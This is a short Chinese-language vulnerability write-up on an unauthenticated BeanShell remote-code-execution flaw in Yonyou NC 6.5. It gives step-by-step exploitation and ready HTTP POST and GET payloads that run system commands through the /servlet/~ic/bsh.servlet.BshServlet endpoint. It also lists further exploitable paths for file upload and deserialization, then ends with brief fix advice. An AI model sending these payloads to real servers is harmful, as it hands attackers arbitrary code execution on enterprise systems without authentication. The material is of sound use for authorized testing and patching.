## 漏洞描述

用友 NC 6.5 版本中 `/servlet/~ic/bsh.servlet.BshServlet` 接口允许未授权访问 BeanShell 脚本执行引擎，攻击者可以直接执行任意 Java 代码。

## 影响版本

- 用友 NC 6.5

## 前置条件

- 无需认证
- 用友NC BeanShell接口可访问

## 利用步骤

1. 确认目标为用友 NC（页面标题/URL 特征 `/nccloud/`）
2. 访问 BeanShell Servlet
3. 执行任意命令

## Payload

```http
POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("whoami")
```

```http
# 或直接 GET
GET /servlet/~ic/bsh.servlet.BshServlet?bsh.script=exec("id") HTTP/1.1
```

## 其他用友 NC 漏洞路径

```
/NCFindWeb?service=IPreAlertConfigService&filename=
/servlet/FileReceiveServlet          → 任意文件上传
/servlet/~ic/bsh.servlet.BshServlet  → BeanShell RCE
/ServiceDispatcherServlet            → 反序列化
```

## 验证方法

访问 BeanShell Servlet 页面，若返回 BeanShell 执行界面则确认漏洞存在。

## 修复建议

1. 升级至最新版本
2. 删除或限制 BeanShell Servlet 的访问
3. 配置 WAF 拦截相关路径
